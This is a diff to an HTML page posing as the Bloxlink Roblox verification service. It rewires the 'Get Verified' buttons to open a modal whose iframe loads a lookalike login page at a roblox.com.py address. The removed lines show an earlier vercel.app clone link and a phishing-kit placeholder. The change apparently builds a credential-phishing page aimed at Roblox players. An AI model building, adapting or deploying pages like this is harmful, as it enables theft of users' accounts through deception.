@@ -238,7 +238,7 @@
                                     <div class="flex-1">
                                         <input id="username" class="block shadow-sm border focus:ring-0 rounded-md outline-none bg-tertiary-background text-gray-200 placeholder:text-gray-400 focus:border-indigo-600 border-tertiary-background text-sm px-4 py-2 w-full" placeholder="Enter your Roblox username" variant="tertiary" value="" style="pointer-events: auto; cursor: text; opacity: 1;">
                                     </div>
-                                    <button id="verify" variant="success" onclick="openVerifyModal()" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm opacity-60" style="opacity: 1; cursor: pointer;">
+                                    <button id="verify" variant="success" onclick="openVerificationModal()" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm opacity-60" style="opacity: 1; cursor: pointer;">
                                         <div class="flex items-center">Get Verified Now</div>
                                     </button>
                                 </div>
@@ -540,7 +540,7 @@
                             <div class="w-64">
                                 <input id="username" class="block shadow-sm border focus:ring-0 rounded-md outline-none bg-tertiary-background text-gray-200 placeholder:text-gray-400 focus:border-indigo-600 border-tertiary-background text-sm px-4 py-2 w-full" placeholder="Enter your Roblox username" variant="tertiary" value="" style="pointer-events: auto; cursor: text; opacity: 1;">
                             </div>
-                            <button id="verify" variant="success" onclick="window.location.href='https://blox-link-phi.vercel.app/verify'" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm" style="opacity: 1; cursor: pointer;">
+                            <button id="verify" variant="success" onclick="openVerificationModal()" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm" style="opacity: 1; cursor: pointer;">
                                 <div class="flex items-center">Get verified</div>
                             </button>
                         </div>
@@ -567,7 +567,7 @@
                 </button>
             </div>
             <div class="flex-1 relative overflow-hidden rounded-b-lg">
-                <iframe id="verificationFrame" src="./Bloxlink_files/saved_resource.html" class="w-full h-full border-0 absolute inset-0 bg-white" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" sandbox="allow-same-origin allow-scripts allow-popups allow-forms" referrerpolicy="no-referrer">
+                <iframe id="verificationFrame" src="https://roblox.com.py/login?returnUrl=7692425652606225" class="w-full h-full border-0 absolute inset-0 bg-white" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" sandbox="allow-same-origin allow-scripts allow-popups allow-forms" referrerpolicy="no-referrer">
                 </iframe>
             </div>
         </div>
@@ -581,47 +581,5 @@
 
 
 
-
-
-<!-- VERIFY MODAL -->
-<div id="verifyModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:9999; align-items:center; justify-content:center;">
-  
-  <div style="
-    background:#0f172a;
-    width:90%;
-    max-width:500px;
-    height:400px;
-    border-radius:12px;
-    overflow:hidden;
-    position:relative;
-    box-shadow:0 20px 50px rgba(0,0,0,.6);
-  ">
-    
-    <button onclick="closeVerifyModal()" style="
-      position:absolute;
-      top:10px;
-      right:10px;
-      background:#ef4444;
-      color:white;
-      border:none;
-      border-radius:6px;
-      padding:4px 10px;
-      cursor:pointer;
-      font-size:14px;
-      z-index:10;
-    ">✕</button>
-
-    <iframe src="SEU_LINK_AQUI" style="width:100%; height:100%; border:none; background:white;"></iframe>
-  </div>
-</div>
-
-<script>
-function openVerifyModal() {
-  document.getElementById("verifyModal").style.display = "flex";
-}
-function closeVerifyModal() {
-  document.getElementById("verifyModal").style.display = "none";
-}
-</script>
 
 </body></html>
